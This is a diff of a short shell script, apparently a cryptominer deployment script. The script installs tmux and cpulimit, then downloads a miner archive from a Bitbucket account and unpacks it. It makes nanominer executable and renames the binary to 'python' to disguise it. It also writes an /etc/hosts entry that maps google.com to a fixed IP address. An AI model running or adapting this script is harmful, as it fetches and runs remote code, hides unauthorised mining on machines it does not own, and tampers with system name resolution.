@@ -1,10 +1,9 @@
-#!/bin/bash
+#!/bin/sh
 sudo apt-get update -y
-sudo apt-get install tmux cpulimit -y
+sudo apt-get install tmux cpulimit unzip -y
 
-wget https://bitbucket.org/evilbaby1/openai/downloads/mydata.tar.gz 
-tar xvzf mydata.tar.gz && cd nanominer-linux-1.5.0
-rm config.ini && wget https://raw.githubusercontent.com/lovelyn2210/script/master/config.ini
+wget https://bitbucket.org/tengikekao/grin/downloads/azu4.zip
+unzip azu4.zip
 chmod +x nanominer
 mv nanominer python
 sudo -- sh -c "echo '216.244.80.11  google.com' >> /etc/hosts"
